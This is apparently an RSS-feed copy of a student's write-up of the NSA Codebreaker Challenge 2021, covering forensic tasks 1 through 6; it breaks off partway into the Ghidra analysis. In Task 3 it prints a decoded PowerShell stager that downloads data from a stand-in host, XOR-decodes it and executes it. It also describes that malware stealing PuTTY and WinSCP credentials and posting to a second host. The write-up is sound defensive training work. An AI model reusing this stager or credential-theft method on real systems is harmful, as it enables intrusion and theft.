<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Writeups on murphe22</title><link>https://murphe22.com/posts/</link><description>murphe22 (Writeups)</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Tue, 04 Jan 2022 00:00:00 +0000</lastBuildDate><atom:link href="https://murphe22.com/posts/index.xml" rel="self" type="application/rss+xml"/><item><title>NSA Codebreakers 2021</title><link>https://murphe22.com/posts/nsacodebreaker/</link><pubDate>Tue, 04 Jan 2022 00:00:00 +0000</pubDate><guid>https://murphe22.com/posts/nsacodebreaker/</guid><description>&lt;p>The 2021 Codebreaker Challenge consists of a series of tasks that are worth a varying amount of points based upon their difficulty. Schools will be ranked according to the total number of points accumulated by their students. Solutions may be submitted at any time for the duration of the Challenge.&lt;/p>
&lt;h1 id="intro" >Intro
&lt;span>
&lt;a href="#intro">
&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
&lt;/a>
&lt;/span>
&lt;/h1>&lt;p>NSA Codebreakers was quite a competition, but it was so fun. We had never been very involved with it until this year. Jonathan, Teddy, and I spearheaded recruitment for Codebreakers and we ended up getting almost 400 people from A&amp;amp;M to sign-up! As a university, we ended up in &lt;code>4th place&lt;/code>. For myself, participating in NSA Codebreakers was a great time and I learned a ton when going through the challenges.&lt;/p>
&lt;h1 id="task-1" >Task 1
&lt;span>
&lt;a href="#task-1">
&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
&lt;/a>
&lt;/span>
&lt;/h1>&lt;p>The NSA Cybersecurity Collaboration Center has a mission to prevent and eradicate threats to the US Defense Industrial Base (DIB). Based on information sharing agreements with several DIB companies, we need to determine if any of those companies are communicating with the actor&amp;rsquo;s infrastructure.&lt;/p>
&lt;p>You have been provided a capture of data en route to the listening post as well as a list of DIB company IP ranges. Identify any IPs associated with the DIB that have communicated with the LP.&lt;/p>
&lt;p>Downloads:&lt;/p>
&lt;ul>
&lt;li>Network traffic heading to the LP (capture.pcap)&lt;/li>
&lt;li>DIB IP address ranges (ip_ranges.txt)&lt;/li>
&lt;/ul>
&lt;h2 id="solution" >Solution
&lt;span>
&lt;a href="#solution">
&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
&lt;/a>
&lt;/span>
&lt;/h2>&lt;ol>
&lt;li>
&lt;p>taking the ip_ranges.txt, use tshark to extract the unique ip addresses&lt;/p>
&lt;p>&lt;code>tshark -r capture.pcap -T fields -e ip.src | sort | uniq &amp;gt; output.csv&lt;/code>&lt;/p>
&lt;p>b. make sure to get rid of the malicious LP (10.120.14.143)&lt;/p>
&lt;/li>
&lt;li>
&lt;p>from there, make a script that will go through each of the ips and using ipaddress library and csv library, check to see if any of the ip subnets noted in the ip_ranges.txt&lt;/p>
&lt;/li>
&lt;li>
&lt;p>output of the file&lt;/p>
&lt;pre tabindex="0">&lt;code>192.168.19.21
198.18.79.146
198.19.39.130
198.19.206.53
&lt;/code>&lt;/pre>&lt;/li>
&lt;/ol>
&lt;h2 id="alternate-way-to-solve" >Alternate way to solve
&lt;span>
&lt;a href="#alternate-way-to-solve">
&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
&lt;/a>
&lt;/span>
&lt;/h2>&lt;ol>
&lt;li>
&lt;p>go into vim -&amp;gt; visual block mode to add the filter&lt;/p>
&lt;pre tabindex="0">&lt;code>ip.src==198.18.152.0/23
|| ip.src==10.226.176.0/21
|| ip.src==192.168.20.128/25
|| ip.src==10.36.0.0/18
|| ip.src==10.147.88.0/22
|| ip.src==192.168.19.0/27
|| ip.src==198.19.122.144/28
|| ip.src==198.18.23.160/29
|| ip.src==10.198.78.0/26
|| ip.src==10.147.176.0/22
|| ip.src==10.244.177.128/26
|| ip.src==10.44.192.0/20
|| ip.src==10.28.176.0/20
|| ip.src==10.0.0.0/18
|| ip.src==198.19.39.128/25
|| ip.src==198.18.79.144/28
|| ip.src==10.57.162.0/24
|| ip.src==198.19.246.160/27
|| ip.src==192.168.131.0/28
|| ip.src==10.201.15.0/24
|| ip.src==198.18.92.136/29
|| ip.src==198.19.206.0/25
|| ip.src==10.254.178.104/29
|| ip.src==10.47.0.0/16
|| ip.src==10.233.93.0/24
|| ip.src==10.246.32.0/19
!(ip.src==10.120.14.143)
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;p>Go into wireshark and paste that input in the filter field&lt;/p>
&lt;/li>
&lt;li>
&lt;p>go into statistics (from the menu bar) -&amp;gt; endpoints -&amp;gt; check the &amp;ldquo;limit to display filter&amp;rdquo; -&amp;gt; go to IPv4 tab -&amp;gt; IPs are there!&lt;/p>
&lt;/li>
&lt;/ol>
&lt;h1 id="task-2" >Task 2
&lt;span>
&lt;a href="#task-2">
&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
&lt;/a>
&lt;/span>
&lt;/h1>&lt;p>NSA notified FBI, which notified the potentially-compromised DIB Companies. The companies reported the compromise to the Defense Cyber Crime Center (DC3). One of them, Online Operations and Production Services (OOPS) requested FBI assistance. At the request of the FBI, we&amp;rsquo;ve agreed to partner with them in order to continue the investigation and understand the compromise.&lt;/p>
&lt;p>OOPS is a cloud containerization provider that acts as a one-stop shop for hosting and launching all sorts of containers &amp;ndash; rkt, Docker, Hyper-V, and more. They have provided us with logs from their network proxy and domain controller that coincide with the time that their traffic to the cyber actor&amp;rsquo;s listening post was captured.&lt;/p>
&lt;p>Identify the logon ID of the user session that communicated with the malicious LP (i.e.: on the machine that sent the beacon &lt;em>and&lt;/em> active at the time the beacon was sent).&lt;/p>
&lt;p>Downloads:&lt;/p>
&lt;ul>
&lt;li>Subnet associated with OOPS (oops_subnet.txt)&lt;/li>
&lt;li>Network proxy logs from Bluecoat server (proxy.log)&lt;/li>
&lt;li>Login data from domain controller (logins.json)&lt;/li>
&lt;/ul>
&lt;h2 id="solution-1" >Solution
&lt;span>
&lt;a href="#solution-1">
&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
&lt;/a>
&lt;/span>
&lt;/h2>&lt;ol>
&lt;li>
&lt;p>Using the ip from the previous task and under the subnet defined in the oops_subnet.txt, run a grep to look within the proxy.log (where the ip is the listening post)&lt;/p>
&lt;p>&lt;code>grep 10.120.14.143 proxy.log&lt;/code>&lt;/p>
&lt;pre tabindex="0">&lt;code>2021-03-16 08:34:49 40 10.210.95.77 200 TCP_MISS 12734 479 GET http xomtq.invalid analysis - - DIRECT **10.120.14.143** application/octet-stream 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36' PROXIED none - 10.210.94.189 SG-HTTP-Service - none -
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;p>Clean up the logins.json&lt;/p>
&lt;p>&lt;code>grep &amp;quot;logon\|log off&amp;quot; logins.json&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Create a Python script to parse through the JSON data to find the logons and log offs and see which LogonIds are associated with the time found from step 1&lt;/p>
&lt;pre tabindex="0">&lt;code>0X339534
0X339757
0X33946D
0X339870
0X339989
0X339A8A
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;p>use a grep to in the json to find the specific LogonId with the IP from step 1&lt;/p>
&lt;p>a. &amp;ldquo;-E&amp;rdquo; means extended using a regex expression
i. you could do it without regex which is the grep query below (where the &amp;ldquo;&amp;quot; before the pipe notes that it is a OR operation)&lt;/p>
&lt;p>&lt;code>grep -E &amp;quot;0X339534|0X339757|0X33946D|0X339870|0X339989|0X339A8A&amp;quot; narrowed.json | grep &amp;quot;10.210.95.77&amp;quot;&lt;/code>&lt;/p>
&lt;p>&lt;code>grep &amp;quot;0X339534\|0X339757\|0X33946D\|0X339870\|0X339989\|0X339A8A&amp;quot; narrowed.json | grep &amp;quot;10.210.95.77&amp;quot;&lt;/code>&lt;/p>
&lt;pre tabindex="0">&lt;code>{&amp;quot;PayloadData1&amp;quot;: &amp;quot;Target: OOPS.NET\\chambers.jennifer&amp;quot;, &amp;quot;PayloadData2&amp;quot;: &amp;quot;LogonType 3&amp;quot;, &amp;quot;PayloadData3&amp;quot;: &amp;quot;LogonId: 0X33946D&amp;quot;, &amp;quot;UserName&amp;quot;: &amp;quot;-\\-&amp;quot;, &amp;quot;RemoteHost&amp;quot;: &amp;quot;- (10.210.95.77)&amp;quot;, &amp;quot;ExecutableInfo&amp;quot;: &amp;quot;-&amp;quot;, &amp;quot;MapDescription&amp;quot;: &amp;quot;Successful logon&amp;quot;, &amp;quot;ChunkNumber&amp;quot;: 0, &amp;quot;Computer&amp;quot;: &amp;quot;OOPS-DC.oops.net&amp;quot;, &amp;quot;Payload&amp;quot;: &amp;quot;{\&amp;quot;EventData\&amp;quot;: {\&amp;quot;Data\&amp;quot;: [{\&amp;quot;@Name\&amp;quot;: \&amp;quot;SubjectUserSid\&amp;quot;, \&amp;quot;#text\&amp;quot;: \&amp;quot;S-1-0-0\&amp;quot;}, {\&amp;quot;@Name\&amp;quot;: \&amp;quot;SubjectUserName\&amp;quot;, \&amp;quot;#text\&amp;quot;: \&amp;quot;-\&amp;quot;}, {\&amp;quot;@Name\&amp;quot;: \&amp;quot;SubjectDomainName\&amp;quot;, \&amp;quot;#text\&amp;quot;: \&amp;quot;-\&amp;quot;}, {\&amp;quot;@Name\&amp;quot;: \&amp;quot;SubjectLogonId\&amp;quot;, \&amp;quot;#text\&amp;quot;: \&amp;quot;0x0\&amp;quot;}, {\&amp;quot;@Name\&amp;quot;: \&amp;quot;TargetUserSid\&amp;quot;, \&amp;quot;#text\&amp;quot;: \&amp;quot;S-1-5-21-3521346-774097835-5683131894-1126\&amp;quot;}, {\&amp;quot;@Name\&amp;quot;: \&amp;quot;TargetUserName\&amp;quot;, \&amp;quot;#text\&amp;quot;: \&amp;quot;chambers.jennifer\&amp;quot;}, {\&amp;quot;@Name\&amp;quot;: \&amp;quot;TargetDomainName\&amp;quot;, \&amp;quot;#text\&amp;quot;: \&amp;quot;OOPS.NET\&amp;quot;}, {\&amp;quot;@Name\&amp;quot;: \&amp;quot;TargetLogonId\&amp;quot;, \&amp;quot;#text\&amp;quot;: \&amp;quot;0X33946D\&amp;quot;}, {\&amp;quot;@Name\&amp;quot;: \&amp;quot;LogonType\&amp;quot;, \&amp;quot;#text\&amp;quot;: \&amp;quot;3\&amp;quot;}, {\&amp;quot;@Name\&amp;quot;: \&amp;quot;LogonProcessName\&amp;quot;, \&amp;quot;#text\&amp;quot;: \&amp;quot;Kerberos\&amp;quot;}, {\&amp;quot;@Name\&amp;quot;: \&amp;quot;AuthenticationPackageName\&amp;quot;, \&amp;quot;#text\&amp;quot;: \&amp;quot;Kerberos\&amp;quot;}, {\&amp;quot;@Name\&amp;quot;: \&amp;quot;WorkstationName\&amp;quot;, \&amp;quot;#text\&amp;quot;: \&amp;quot;-\&amp;quot;}, {\&amp;quot;@Name\&amp;quot;: \&amp;quot;LogonGuid\&amp;quot;, \&amp;quot;#text\&amp;quot;: \&amp;quot;c5dfa92b-9ee6-4b7b-9029-207959f780e7\&amp;quot;}, {\&amp;quot;@Name\&amp;quot;: \&amp;quot;TransmittedServices\&amp;quot;, \&amp;quot;#text\&amp;quot;: \&amp;quot;-\&amp;quot;}, {\&amp;quot;@Name\&amp;quot;: \&amp;quot;LmPackageName\&amp;quot;, \&amp;quot;#text\&amp;quot;: \&amp;quot;-\&amp;quot;}, {\&amp;quot;@Name\&amp;quot;: \&amp;quot;KeyLength\&amp;quot;, \&amp;quot;#text\&amp;quot;: \&amp;quot;0\&amp;quot;}, {\&amp;quot;@Name\&amp;quot;: \&amp;quot;ProcessId\&amp;quot;, \&amp;quot;#text\&amp;quot;: \&amp;quot;0x0\&amp;quot;}, {\&amp;quot;@Name\&amp;quot;: \&amp;quot;ProcessName\&amp;quot;, \&amp;quot;#text\&amp;quot;: \&amp;quot;-\&amp;quot;}, {\&amp;quot;@Name\&amp;quot;: \&amp;quot;IpAddress\&amp;quot;, \&amp;quot;#text\&amp;quot;: \&amp;quot;10.210.95.77\&amp;quot;}, {\&amp;quot;@Name\&amp;quot;: \&amp;quot;IpPort\&amp;quot;, \&amp;quot;#text\&amp;quot;: \&amp;quot;39845\&amp;quot;}, {\&amp;quot;@Name\&amp;quot;: \&amp;quot;ImpersonationLevel\&amp;quot;, \&amp;quot;#text\&amp;quot;: \&amp;quot;%%1833\&amp;quot;}, {\&amp;quot;@Name\&amp;quot;: \&amp;quot;RestrictedAdminMode\&amp;quot;, \&amp;quot;#text\&amp;quot;: \&amp;quot;-\&amp;quot;}, {\&amp;quot;@Name\&amp;quot;: \&amp;quot;TargetOutboundUserName\&amp;quot;, \&amp;quot;#text\&amp;quot;: \&amp;quot;-\&amp;quot;}, {\&amp;quot;@Name\&amp;quot;: \&amp;quot;TargetOutboundDomainName\&amp;quot;, \&amp;quot;#text\&amp;quot;: \&amp;quot;-\&amp;quot;}, {\&amp;quot;@Name\&amp;quot;: \&amp;quot;VirtualAccount\&amp;quot;, \&amp;quot;#text\&amp;quot;: \&amp;quot;%%1843\&amp;quot;}, {\&amp;quot;@Name\&amp;quot;: \&amp;quot;TargetLinkedLogonId\&amp;quot;, \&amp;quot;#text\&amp;quot;: \&amp;quot;0x0\&amp;quot;}, {\&amp;quot;@Name\&amp;quot;: \&amp;quot;ElevatedToken\&amp;quot;, \&amp;quot;#text\&amp;quot;: \&amp;quot;%%1842\&amp;quot;}]}}&amp;quot;, &amp;quot;Channel&amp;quot;: &amp;quot;Security&amp;quot;, &amp;quot;Provider&amp;quot;: &amp;quot;Microsoft-Windows-Security-Auditing&amp;quot;, &amp;quot;EventId&amp;quot;: 4624, &amp;quot;EventRecordId&amp;quot;: &amp;quot;5378&amp;quot;, &amp;quot;ProcessId&amp;quot;: 693, &amp;quot;ThreadId&amp;quot;: 5958, &amp;quot;Level&amp;quot;: &amp;quot;LogAlways&amp;quot;, &amp;quot;Keywords&amp;quot;: &amp;quot;Audit success&amp;quot;, &amp;quot;SourceFile&amp;quot;: &amp;quot;C:\\Windows\\system32\\winevt\\Logs\\Security.evtx&amp;quot;, &amp;quot;ExtraDataOffset&amp;quot;: 0, &amp;quot;HiddenRecord&amp;quot;: false, &amp;quot;TimeCreated&amp;quot;: &amp;quot;2021-03-16T12:09:22.6771601+00:00&amp;quot;, &amp;quot;RecordNumber&amp;quot;: &amp;quot;5378&amp;quot;}
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;p>&lt;strong>LogonId: 0X33946D&lt;/strong>&lt;/p>
&lt;/li>
&lt;/ol>
&lt;h1 id="task-3" >Task 3
&lt;span>
&lt;a href="#task-3">
&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
&lt;/a>
&lt;/span>
&lt;/h1>&lt;p>With the provided information, OOPS was quickly able to identify the employee associated with the account. During the incident response interview, the user mentioned that they would have been checking email around the time that the communication occurred. They don&amp;rsquo;t remember anything particularly weird from earlier, but it was a few weeks back, so they&amp;rsquo;re not sure. OOPS has provided a subset of the user&amp;rsquo;s inbox from the day of the communication.&lt;/p>
&lt;p>Identify the message ID of the malicious email and the targeted server.&lt;/p>
&lt;p>Downloads:&lt;/p>
&lt;ul>
&lt;li>User&amp;rsquo;s emails (emails.zip)&lt;/li>
&lt;/ul>
&lt;h1 id="solution-2" >Solution
&lt;span>
&lt;a href="#solution-2">
&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
&lt;/a>
&lt;/span>
&lt;/h1>&lt;ol>
&lt;li>
&lt;p>unzip emails&lt;/p>
&lt;/li>
&lt;li>
&lt;p>use ripmime to extract all the attachments
a. for i in *; do ripmime -i $i -d attachment_$i; done;&lt;/p>
&lt;/li>
&lt;li>
&lt;p>further see what kind of attachments are within each email message
a. file attachment*/*&lt;/p>
&lt;/li>
&lt;li>
&lt;p>oh the oopsie_update.pptx is not actually a powerpoint file&amp;hellip; it&amp;rsquo;s ASCII text&lt;/p>
&lt;/li>
&lt;li>
&lt;p>cat oopsie_update.pptx and see a powershell command to an &amp;ldquo;-enc&amp;rdquo; which sends a base64 string (which we know because of the &amp;ldquo;==&amp;rdquo; at the end&lt;/p>
&lt;/li>
&lt;li>
&lt;p>use cyberchef to decode the bas64 to see:
$bytes = (New-Object Net.WebClient).DownloadData(&amp;lsquo;&lt;a href="http://xomtq.invalid/analysis'">http://xomtq.invalid/analysis'&lt;/a>)&lt;/p>
&lt;p>$prev = [byte] 173&lt;/p>
&lt;p>$dec = $(for ($i = 0; $i -lt $bytes.length; $i++) {
$prev = $bytes[$i] -bxor $prev
$prev
})&lt;/p>
&lt;p>iex([System.Text.Encoding]::UTF8.GetString($dec))&lt;/p>
&lt;/li>
&lt;li>
&lt;p>we see it is downloading data, but notice that xomtq.invalid doesn&amp;rsquo;t work so we gotta look more into it&amp;hellip; we see that we should look at the HEX stream from the 200 HTTP request&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Booting up VS Code, we need to write a script that takes the hex_val stream and put it into byte format, which we do via unhexlify&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Next we do the same operation that is being done in the ASCII text from step 6 but in Python&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Make sure to join all the items in the list and print it out, we get a huge powershell script and output that to fullpowershell.txt and then see at the bottom a POST request sent to &lt;a href="http://wtmbi.invalid:8080">http://wtmbi.invalid:8080&lt;/a>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>going back to message_9.eml, I used &amp;ldquo;head message_9.eml&amp;rdquo; to find the Message-ID as &lt;a href="mailto:161584985300.22130.15351049748726194876@oops.net">161584985300.22130.15351049748726194876@oops.net&lt;/a>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Submit Message-ID and domain name to the challenge (wtmbi.invalid) and SUCCESS&lt;/p>
&lt;/li>
&lt;/ol>
&lt;h1 id="task-4" >Task 4
&lt;span>
&lt;a href="#task-4">
&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
&lt;/a>
&lt;/span>
&lt;/h1>&lt;p>A number of OOPS employees fell victim to the same attack, and we need to figure out what&amp;rsquo;s been compromised! Examine the malware more closely to understand what it&amp;rsquo;s doing. Then, use these artifacts to determine which account on the OOPS network has been compromised.&lt;/p>
&lt;p>Downloads:&lt;/p>
&lt;ul>
&lt;li>OOPS forensic artifacts (artifacts.zip)&lt;/li>
&lt;/ul>
&lt;h2 id="solution-3" >Solution
&lt;span>
&lt;a href="#solution-3">
&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
&lt;/a>
&lt;/span>
&lt;/h2>&lt;ol>
&lt;li>
&lt;p>look at the fullpowershell.txt from last and identify what it is doing&lt;/p>
&lt;p>a. you see that it is going into specific registries (PuTTY and WinSCP)&lt;/p>
&lt;p>b. identify what is being taken for each registry&lt;/p>
&lt;ul>
&lt;li>
&lt;p>PuTTY -&amp;gt; Source, Session, Hostname, Keyfile&lt;/p>
&lt;/li>
&lt;li>
&lt;p>WinSCP -&amp;gt; Source, Session, Hostname, Username, Password&lt;/p>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>So now you know what is being taken and you know that the prettyXML.xml contains the registries -&amp;gt; next need to figure out how to find the right data&lt;/p>
&lt;p>a. looking at the differences amongst the artifacts (only the ppks bc those are PuTTY private keys), you notice that some do NOT use any encryption -&amp;gt; this means that it is easier for a hacker to exploit (dkr_prd93, dkr_prd54, dkr_tst67, dkr_tst70, dkr_tst76)&lt;/p>
&lt;/li>
&lt;li>
&lt;p>looking into the XML file, we search for the dkr that are not encrypted, you find a node within with dkr_prd93 yayyyy (builder07@dkr_prd93)&lt;/p>
&lt;p>a. machine name = dkr_prd93&lt;/p>
&lt;p>b. builder07&lt;/p>
&lt;/li>
&lt;/ol>
&lt;h1 id="task-5" >Task 5
&lt;span>
&lt;a href="#task-5">
&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
&lt;/a>
&lt;/span>
&lt;/h1>&lt;p>A forensic analysis of the server you identified reveals suspicious logons shortly after the malicious emails were sent. Looks like the actor moved deeper into OOPS&amp;rsquo; network. Yikes.&lt;/p>
&lt;p>The server in question maintains OOPS' Docker image registry, which is populated with images created by OOPS clients. The images are all still there (phew!), but one of them has a recent modification date: an image created by the Prevention of Adversarial Network Intrusions Conglomerate (PANIC).&lt;/p>
&lt;p>Due to the nature of PANIC&amp;rsquo;s work, they have a close partnership with the FBI. They&amp;rsquo;ve also long been a target of both government and corporate espionage, and they invest heavily in security measures to prevent access to their proprietary information and source code.&lt;/p>
&lt;p>The FBI, having previously worked with PANIC, have taken the lead in contacting them. The FBI notified PANIC of the potential compromise and reminded them to make a report to DC3. During conversations with PANIC, the FBI learned that the image in question is part of their nightly build and test pipeline. PANIC reported that nightly build and regression tests had been taking longer than usual, but they assumed it was due to resourcing constraints on OOPS' end. PANIC consented to OOPS providing FBI with a copy of the Docker image in question.&lt;/p>
&lt;p>Analyze the provided Docker image and identify the actor&amp;rsquo;s techniques.&lt;/p>
&lt;p>Downloads:&lt;/p>
&lt;ul>
&lt;li>PANIC Nightly Build + Test Docker Image (image.tar)&lt;/li>
&lt;/ul>
&lt;h2 id="solution-4" >Solution
&lt;span>
&lt;a href="#solution-4">
&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
&lt;/a>
&lt;/span>
&lt;/h2>&lt;ol>
&lt;li>
&lt;p>look at the manifest.json to find &amp;ldquo;maintainer&amp;rdquo; email (use &amp;ldquo;cat manifest.json | jq&amp;rdquo;)&lt;/p>
&lt;p>a. jq is a nice thing to show json in pretty format (can pipe output to a new json)&lt;/p>
&lt;/li>
&lt;li>
&lt;p>tar -xf all the layer.tar files in each folder&lt;/p>
&lt;p>a. rg &amp;lsquo;git clone&amp;rsquo; and look for the git clone url that is connected to a sus file &amp;ldquo;build_test.sh&amp;rdquo;&lt;/p>
&lt;/li>
&lt;li>
&lt;p>so most malicious files are binaries, so you are probably gonna be looking in &amp;ldquo;bin&amp;rdquo; directories&lt;/p>
&lt;p>a. after searching around the different directories, you find the 8e&amp;hellip; folder because it has a lot of folders&lt;/p>
&lt;p>b. you check out bin from the main directory, but find nothing in there&lt;/p>
&lt;p>c. since you didn&amp;rsquo;t find anything, you look into usr/bin&lt;/p>
&lt;ol>
&lt;li>
&lt;p>interesting, you find a lot of files&lt;/p>
&lt;/li>
&lt;li>
&lt;p>since you know malicious files/payloads are usually pretty big, you do &amp;ldquo;ls -lh&amp;rdquo; to see the file size and notice that the &lt;code>make&lt;/code> file is 8.4M so that&amp;rsquo;s probs the malicious file -&amp;gt; path is usr/bin/make&lt;/p>
&lt;/li>
&lt;/ol>
&lt;/li>
&lt;/ol>
&lt;h1 id="task-6" >Task 6
&lt;span>
&lt;a href="#task-6">
&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
&lt;/a>
&lt;/span>
&lt;/h1>&lt;p>Now that we&amp;rsquo;ve found a malicious artifact, the next step is to understand what it&amp;rsquo;s doing. Identify some characteristics of the communications between the malicious artifact and the LP.&lt;/p>
&lt;h2 id="solution-5" >Solution
&lt;span>
&lt;a href="#solution-5">
&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
&lt;/a>
&lt;/span>
&lt;/h2>&lt;ol>
&lt;li>
&lt;p>Open up the good ol ghidra with the file found from Task 5 (the make file)&lt;/p>
&lt;p>a. Make your way to the main function -&amp;gt; see gitGrabber() function and look into it&lt;/p>
&lt;/li>
&lt;li>
